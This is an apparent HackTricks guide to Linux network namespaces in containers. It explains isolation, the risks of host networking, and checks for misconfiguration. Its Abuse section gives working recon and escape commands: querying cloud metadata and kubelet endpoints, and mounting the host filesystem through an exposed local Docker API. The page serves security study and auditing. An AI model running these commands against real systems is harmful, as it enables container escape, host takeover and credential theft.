_body: "# Network Namespace\n\n{{#include ../../../../../banners/hacktricks-training.md}}\n\n## Overview\n\nThe network namespace\
  \ isolates network-related resources such as interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules,\
  \ sockets, and the contents of files like `/proc/net`. This is why a container can have what looks like its own `eth0`,\
  \ its own local routes, and its own loopback device without owning the host's real network stack.\n\nSecurity-wise, this\
  \ matters because network isolation is about much more than port binding. A private network namespace limits what the workload\
  \ can directly observe or reconfigure. Once that namespace is shared with the host, the container may suddenly gain visibility\
  \ into host listeners, host-local services, and network control points that were never meant to be exposed to the application.\n\
  \n## Operation\n\nA freshly created network namespace begins with an empty or almost empty network environment until interfaces\
  \ are attached to it. Container runtimes then create or connect virtual interfaces, assign addresses, and configure routes\
  \ so the workload has the expected connectivity. In bridge-based deployments, this usually means the container sees a veth-backed\
  \ interface connected to a host bridge. In Kubernetes, CNI plugins handle the equivalent setup for Pod networking.\n\nThis\
  \ architecture explains why `--network=host` or `hostNetwork: true` is such a dramatic change. Instead of receiving a prepared\
  \ private network stack, the workload joins the host's actual one.\n\n## Lab\n\nYou can see a nearly empty network namespace\
  \ with:\n\n```bash\nsudo unshare --net --fork bash\nip addr\nip route\n```\n\nAnd you can compare normal and host-networked\
  \ containers with:\n\n```bash\ndocker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'\ndocker run --rm --network=host\
  \ debian:stable-slim sh -c 'ss -lntp | head'\n```\n\nThe host-networked container no longer has its own isolated socket\
  \ and interface view. That change alone is already significant before you even ask what capabilities the process has.\n\n\
  ## Runtime Usage\n\nDocker and Podman normally create a private network namespace for each container unless configured otherwise.\
  \ Kubernetes usually gives each Pod its own network namespace, shared by the containers inside that Pod but separate from\
  \ the host. Incus/LXC systems also provide rich network-namespace based isolation, often with a wider variety of virtual\
  \ networking setups.\n\nThe common principle is that private networking is the default isolation boundary, while host networking\
  \ is an explicit opt-out from that boundary.\n\n## Misconfigurations\n\nThe most important misconfiguration is simply sharing\
  \ the host network namespace. This is sometimes done for performance, low-level monitoring, or convenience, but it removes\
  \ one of the cleanest boundaries available to containers. Host-local listeners become reachable in a more direct way, localhost-only\
  \ services may become accessible, and capabilities such as `CAP_NET_ADMIN` or `CAP_NET_RAW` become much more dangerous because\
  \ the operations they enable are now applied to the host's own network environment.\n\nAnother problem is overgranting network-related\
  \ capabilities even when the network namespace is private. A private namespace does help, but it does not make raw sockets\
  \ or advanced network control harmless.\n\nIn Kubernetes, `hostNetwork: true` also changes how much faith you can place\
  \ in Pod-level network segmentation. Kubernetes documents that many network plugins cannot properly distinguish `hostNetwork`\
  \ Pod traffic for `podSelector` / `namespaceSelector` matching and therefore treat it as ordinary node traffic. From an\
  \ attacker's point of view, that means a compromised `hostNetwork` workload should often be treated as a node-level network\
  \ foothold rather than as a normal Pod still constrained by the same policy assumptions as overlay-network workloads.\n\n\
  ## Abuse\n\nIn weakly isolated setups, attackers may inspect host listening services, reach management endpoints bound only\
  \ to loopback, sniff or interfere with traffic depending on the exact capabilities and environment, or reconfigure routing\
  \ and firewall state if `CAP_NET_ADMIN` is present. In a cluster, this can also make lateral movement and control-plane\
  \ reconnaissance easier.\n\nIf you suspect host networking, start by confirming that the visible interfaces and listeners\
  \ belong to the host rather than to an isolated container network:\n\n```bash\nip addr\nip route\nss -lntup | head -n 50\n\
  ```\n\nLoopback-only services are often the first interesting discovery:\n\n```bash\nss -lntp | grep '127.0.0.1'\ncurl -s\
  \ http://127.0.0.1:2375/version 2>/dev/null\ncurl -sk https://127.0.0.1:2376/version 2>/dev/null\n```\n\nIf network capabilities\
  \ are present, test whether the workload can inspect or alter the visible stack:\n\n```bash\ncapsh --print | grep -E 'cap_net_admin|cap_net_raw'\n\
  iptables -S 2>/dev/null || nft list ruleset 2>/dev/null\nip link show\n```\n\nOn modern kernels, host networking plus `CAP_NET_ADMIN`\
  \ may also expose the packet path beyond simple `iptables` / `nftables` changes. `tc` qdiscs and filters are namespace-scoped\
  \ too, so in a shared host network namespace they apply to the host interfaces the container can see. If `CAP_BPF` is additionally\
  \ present, network-related eBPF programs such as TC and XDP loaders become relevant as well:\n\n```bash\ncapsh --print |\
  \ grep -E 'cap_net_admin|cap_net_raw|cap_bpf'\nfor i in $(ls /sys/class/net 2>/dev/null); do\n  echo \"== $i ==\"\n  tc\
  \ qdisc show dev \"$i\" 2>/dev/null\n  tc filter show dev \"$i\" ingress 2>/dev/null\n  tc filter show dev \"$i\" egress\
  \ 2>/dev/null\ndone\nbpftool net 2>/dev/null\n```\n\nThis matters because an attacker may be able to mirror, redirect, shape,\
  \ or drop traffic at the host interface level, not just rewrite firewall rules. In a private network namespace those actions\
  \ are contained to the container view; in a shared host namespace they become host-impacting.\n\nIn cluster or cloud environments,\
  \ host networking also justifies quick local recon of metadata and control-plane-adjacent services:\n\n```bash\nfor u in\
  \ \\\n  http://169.254.169.254/latest/meta-data/ \\\n  http://100.100.100.200/latest/meta-data/ \\\n  http://127.0.0.1:10250/pods;\
  \ do\n  curl -m 2 -s \"$u\" 2>/dev/null | head\ndone\n```\n\n### Full Example: Host Networking + Local Runtime / Kubelet\
  \ Access\n\nHost networking does not automatically provide host root, but it often exposes services that are intentionally\
  \ reachable only from the node itself. If one of those services is weakly protected, host networking becomes a direct privilege-escalation\
  \ path.\n\nDocker API on localhost:\n\n```bash\ncurl -s http://127.0.0.1:2375/version 2>/dev/null\ndocker -H tcp://127.0.0.1:2375\
  \ run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null\n```\n\nKubelet on localhost:\n\n```bash\ncurl -k https://127.0.0.1:10250/pods\
  \ 2>/dev/null | head\ncurl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head\n```\n\nImpact:\n\n- direct host compromise\
  \ if a local runtime API is exposed without proper protection\n- cluster reconnaissance or lateral movement if kubelet or\
  \ local agents are reachable\n- traffic manipulation or denial of service when combined with `CAP_NET_ADMIN`\n\n## Checks\n\
  \nThe goal of these checks is to learn whether the process has a private network stack, what routes and listeners are visible,\
  \ and whether the network view already looks host-like before you even test capabilities.\n\n```bash\nreadlink /proc/self/ns/net\
  \   # Current network namespace identifier\nreadlink /proc/1/ns/net      # Compare with PID 1 in the current container /\
  \ pod\nlsns -t net 2>/dev/null      # Reachable network namespaces from this view\nip netns identify $$ 2>/dev/null\nip\
  \ addr                      # Visible interfaces and addresses\nip route                     # Routing table\nss -lntup\
  \                    # Listening TCP/UDP sockets with process info\n```\n\nWhat is interesting here:\n\n- If `/proc/self/ns/net`\
  \ and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private\
  \ namespace.\n- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent\
  \ namespace and you want to correlate it with `/run/netns` objects from the host side.\n- `ss -lntup` is especially valuable\
  \ because it reveals loopback-only listeners and local management endpoints.\n- Routes, interface names, firewall context,\
  \ `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.\n\
  - In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy:\
  \ ClusterFirstWithHostNet`, not that the service is absent.\n\nWhen reviewing a container, always evaluate the network namespace\
  \ together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge\
  \ networking plus a narrow default capability set.\n\n## References\n\n- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)\n\
